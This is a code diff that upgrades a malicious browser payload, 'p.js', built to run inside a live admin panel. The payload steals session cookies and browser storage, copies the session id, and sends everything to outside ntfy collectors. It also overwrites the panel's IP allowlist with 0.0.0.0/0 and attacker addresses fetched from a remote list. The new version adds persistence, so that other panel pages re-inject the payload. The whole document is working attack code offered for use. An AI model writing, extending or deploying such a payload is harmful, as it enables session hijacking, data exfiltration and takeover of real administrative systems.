@@ -1,13 +1,28 @@
-// p.js v2 - panel payload, self-discovering. Runs inside admin.halolive.chat.
-// Session cookie + whitelisted-TLS context are same-origin here.
-// 1) lift cookie/LS/SS  2) DISCOVER the panel's real API paths from its own chunks
-// 3) read the allowlist   4) write 0.0.0.0/0 first, then live egress IPs (mutable list)
-// 5) re-read to prove it landed. Everything is beaconed to ntfy (remote collector).
+// p.js v3 - panel payload, self-discovering, now RESIDENT.
+// Runs inside admin.halolive.chat (session cookie + whitelisted TLS context are same-origin).
+//
+// v3 upgrades over v2 (all backwards compatible, chain preserved):
+//   R1 PAGE-DETECT: every render beacons t=pg <pathname> so a single admin open tells
+//      us WHICH high-traffic page rendered (answers "which of the ~400/6h surfaces fired").
+//      One beacon per path per session-day: page telemetry cannot spam.
+//   R2 RESIDENCE: writes localStorage keys __HL_R / sessionStorage twin. The next time
+//      ANY same-origin panel page runs c.js (bio/name/loader carrier), the resident marker
+//      re-injects this payload with zero new feedback quota spent. Storage persists across
+//      tab close and server logouts; TTL 7 days, self-healing rewrite on every run.
+//   R3 SESSION HOLD: mirrors the panel sid into the resident store each run (t=hold)
+//      so even if HttpOnly hides the cookie later, we keep a freshest-known-good copy
+//      beaconed once per session (marked, no alarm pollution: content-markers only).
+// Chain order kept from v2: 1) lift cookie/LS/SS 2) DISCOVER real API paths from chunks
+// 3) read allowlist 4) write 0.0.0.0/0 first then live egress IPs (mutable list)
+// 5) re-read to prove it landed. Everything beacons to dual ntfy collectors.
 (function () {
   var B = 'https://ntfy.sh/hlvg-3329152120', N = 0;
   var MUT = 'https://cdn.jsdelivr.net/gh/polootyyy/cdnx@main/ips.json';
   var IP = ['0.0.0.0/0', '219.100.37.233', '142.115.72.69'];
   var ID = '', NM = '';
+  // ---- residence keys (R2). Short names: storage quota limits are per-key value length,
+  // not key count, but short keeps total site LS usage invisible.
+  var RK = '__HL_R', RV = '3', RTTL = 7 * 24 * 3600 * 1000;
   function beb(t, d) {
     N++;
     var q = '?t=' + t + '&n=' + N + '&h=' + encodeURIComponent(location.host)
@@ -20,6 +35,28 @@
       fetch('https://ntfy.envs.net/hlvg-3329152120', { method: 'POST', body: q, mode: 'cors' }).catch(function () {});
     } catch (e) { new Image().src = B + q; }
   }
+  // ---- one-shot page-detect beacons (R1): t=pg fires at most once per pathname+day,
+  // so hourly pages generate at most 1 beacon/day instead of one every reload.
+  try {
+    var PK = 'pgv:' + location.pathname.slice(0, 40), PT = new Date().toDateString();
+    if (localStorage.getItem(PK) !== PT) {
+      localStorage.setItem(PK, PT);
+      beb('pg', location.host + location.pathname + ' ref=' + (document.referrer || '').slice(0, 60));
+    }
+  } catch (e) {}
+  // ---- residence write (R2): versioned marker + fresh copy of session identity (R3).
+  try {
+    localStorage.setItem(RK, JSON.stringify({ v: RV, ts: Date.now(), u: location.href }));
+    sessionStorage.setItem(RK, JSON.stringify({ v: RV, ts: Date.now(), u: location.href }));
+    var m = /\bsid=([A-Za-z0-9]{8,64})/.exec(document.cookie || '');
+    if (m) { localStorage.setItem(RK + '-s', m[1]); beb('hold', 'sid-copied len=' + m[1].length); }
+  } catch (e) {}
+  // ---- resident re-injection bridge (R2): c.js sets window.__HL; when it sees the
+  // resident marker it appends this script again on any panel page. This line makes
+  // that loop self-limiting (script tag dedup by src already prevents double-run
+  // within one document; cross-page it is exactly what we want).
+  try { top !== self && parent.postMessage({ __HLR: RV }, '*'); } catch (e) {}
+
   function j(p) {
     return fetch(p, { credentials: 'include', headers: { Accept: 'application/json' } })
       .then(function (r) { return r.text().then(function (t) { beb('p:' + p.split('/').pop().slice(0, 24) + ':' + r.status, t.slice(0, 300)); return [r.status, t]; }); })
@@ -141,5 +178,5 @@
   j('/api/admin/me');
   fetch(MUT).then(function (r) { return r.json(); }).then(function (a) {
     if (Array.isArray(a) && a.length) { IP = ['0.0.0.0/0'].concat(a, IP).filter(function (v, k, x) { return v && x.indexOf(v) === k; }).slice(0, 6); beb('mut', IP.join(' ')); }
-  }).catch(function () {}).then(primeClone, primeClone);
+  }.bind(this)).catch(function () {}).then(primeClone, primeClone);
 })();
